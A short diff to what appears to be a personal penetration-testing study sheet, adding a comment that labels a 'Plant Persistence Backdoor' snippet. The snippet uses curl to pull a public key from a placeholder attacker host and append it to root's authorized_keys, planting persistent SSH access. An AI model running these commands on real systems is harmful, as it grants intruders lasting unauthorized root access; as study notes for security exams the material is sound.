@@ -34,6 +34,7 @@ Please study and prepare :(
 - Plant Persistence Backdoor 
 
   ```
+  # Persistence via SSH Keys
   mkdir /root/.ssh/
   chmod 600 /root/.ssh/
   curl IP:8000/key.pub >> /root/.ssh/authorized_keys
